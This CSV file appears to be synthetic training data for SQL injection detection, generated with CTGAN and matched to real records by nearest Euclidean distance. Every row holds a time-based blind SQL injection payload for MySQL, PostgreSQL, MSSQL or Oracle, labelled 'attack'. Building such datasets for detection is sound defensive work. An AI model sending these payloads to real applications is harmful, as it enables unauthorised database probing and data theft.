id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000265,7.115802783529767
CTGAN_000002,attack,time,"1""  )   where 2922  =  2922 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000262,5.96647794486381
CTGAN_000003,attack,time,1'+  (  select 'diet' where 7004  =  7004 rlike sleep  (  5   )    )   +',nearest_attack_euclidean,R000212,7.072555032716755
CTGAN_000004,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000097,6.526266816268947
CTGAN_000005,attack,time,"1 where 5401  =  5401 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000153,5.832163680869863
CTGAN_000006,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000034,6.342204183992509
CTGAN_000007,attack,time,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,nearest_attack_euclidean,R000119,7.503929908514507
CTGAN_000008,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000195,6.13942213525614
CTGAN_000009,attack,time,1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000033,6.582092623295754
CTGAN_000010,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000097,7.209273828751766
CTGAN_000011,attack,time,"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""ckht""  =  ""ckht",nearest_attack_euclidean,R000297,7.624046141271876
CTGAN_000012,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000273,6.5196396472604246
CTGAN_000013,attack,time,1'   )    )    as nsfx where 9553  =  9553 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000242,5.519545124609223
CTGAN_000014,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000092,7.107396638171376
CTGAN_000015,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000017,7.247865964831442
CTGAN_000016,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000084,7.814690420664357
CTGAN_000017,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",nearest_attack_euclidean,R000259,8.305217716328682
CTGAN_000018,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000003,6.761754113296337
CTGAN_000019,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000088,7.3663614951455765
CTGAN_000020,attack,time,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""ahhx"" like ""ahhx",nearest_attack_euclidean,R000074,8.254941358294635
CTGAN_000021,attack,time,1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',nearest_attack_euclidean,R000179,8.763673239924595
CTGAN_000022,attack,time,1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000233,8.989154819678536
CTGAN_000023,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   +',nearest_attack_euclidean,R000216,8.122316647239117
CTGAN_000024,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000072,8.224926511779039
CTGAN_000025,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000209,8.168929094972407
CTGAN_000026,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000265,6.772161749156696
CTGAN_000027,attack,time,1%'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000266,8.155664715864633
CTGAN_000028,attack,time,"1""   )    )    as dpln where 4193  =  4193 rlike sleep  (  5  )  --",nearest_attack_euclidean,R000292,8.236124969435206
CTGAN_000029,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000104,9.036284771563016
CTGAN_000030,attack,time,1'   )    )    as nsfx where 9553  =  9553 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000242,5.554014374578327
CTGAN_000031,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000181,8.005627156207886
CTGAN_000032,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000288,6.372385824791111
CTGAN_000033,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000076,4.8524856025609235
CTGAN_000034,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000017,7.160338063348601
CTGAN_000035,attack,time,1'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000192,8.100173435420054
CTGAN_000036,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000020,5.644154472635713
CTGAN_000037,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000097,6.03281233932698
CTGAN_000038,attack,time,"1'  )   where 4778  =  4778 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000246,6.471710450687836
CTGAN_000039,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000116,5.901404031502211
CTGAN_000040,attack,time,1'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000192,6.811033406639729
CTGAN_000041,attack,time,1'+  (  select 'sfko' where 6853  =  6853 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000096,8.45478434248071
CTGAN_000042,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000072,7.730684654583567
CTGAN_000043,attack,time,1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,nearest_attack_euclidean,R000086,5.727610022169964
CTGAN_000044,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,nearest_attack_euclidean,R000042,7.529122846092546
CTGAN_000045,attack,time,1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #,nearest_attack_euclidean,R000052,8.012555915885343
CTGAN_000046,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000084,7.043363404824817
CTGAN_000047,attack,time,"1""  )   where 2922  =  2922 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000262,6.174835580403428
CTGAN_000048,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000265,7.309714184117369
CTGAN_000049,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000007,7.132071290597508
CTGAN_000050,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000017,7.763973642697477
CTGAN_000051,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000039,7.3389313054646435
CTGAN_000052,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000097,7.49852166684863
CTGAN_000053,attack,time,"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000011,7.390356455889775
CTGAN_000054,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000046,7.633985326966951
CTGAN_000055,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000294,7.456682506340395
CTGAN_000056,attack,time,1'   )    )    as nsfx where 9553  =  9553 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000242,7.608643815632975
CTGAN_000057,attack,time,1'+  (  select 'sfko' where 6853  =  6853 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000096,8.716796149411552
CTGAN_000058,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000097,6.358797829973526
CTGAN_000059,attack,time,1   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000189,4.728797020132755
CTGAN_000060,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000195,7.327325657267004
CTGAN_000061,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000017,6.867851981797326
CTGAN_000062,attack,time,1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,nearest_attack_euclidean,R000086,7.346222650985272
CTGAN_000063,attack,time,1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000233,8.78601657495032
CTGAN_000064,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000039,7.635175680936579
CTGAN_000065,attack,time,1'+  (  select 'diet' where 7004  =  7004 rlike sleep  (  5   )    )   +',nearest_attack_euclidean,R000212,8.9537648854675
CTGAN_000066,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000025,6.136263995950177
CTGAN_000067,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000104,7.984339056711494
CTGAN_000068,attack,time,"1""   )    )    as dpln where 4193  =  4193 rlike sleep  (  5  )  --",nearest_attack_euclidean,R000292,7.033205854693361
CTGAN_000069,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000195,7.9249658583451135
CTGAN_000070,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""phcl"" like ""phcl",nearest_attack_euclidean,R000275,7.068473629869241
CTGAN_000071,attack,time,1   )    )    as skex where 7941  =  7941 and sleep  (  5  )  --,nearest_attack_euclidean,R000176,6.007115375847053
CTGAN_000072,attack,time,"1'  )   where 4778  =  4778 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000246,6.960977818870434
CTGAN_000073,attack,time,"1%""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000058,6.697712608141221
CTGAN_000074,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'bbqk'  =  'bbqk,nearest_attack_euclidean,R000247,6.763834080021968
CTGAN_000075,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000161,6.424998684977794
CTGAN_000076,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000220,7.402644279818838
CTGAN_000077,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000166,7.558258679159326
CTGAN_000078,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000089,8.015470354897214
CTGAN_000079,attack,time,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '",nearest_attack_euclidean,R000159,6.139735341322255
CTGAN_000080,attack,time,1'   )    )    as nsfx where 9553  =  9553 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000242,6.781735903362162
CTGAN_000081,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000273,8.125890065036561
CTGAN_000082,attack,time,1'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000280,7.42360518617365
CTGAN_000083,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000088,8.075152586554552
CTGAN_000084,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  ) ,nearest_attack_euclidean,R000238,6.159595776038971
CTGAN_000085,attack,time,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000210,9.81644241602547
CTGAN_000086,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000265,7.888595541135516
CTGAN_000087,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000097,5.806297144400495
CTGAN_000088,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'hokd'  =  'hokd,nearest_attack_euclidean,R000095,6.14319956296967
CTGAN_000089,attack,time,1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000214,8.89850026991054
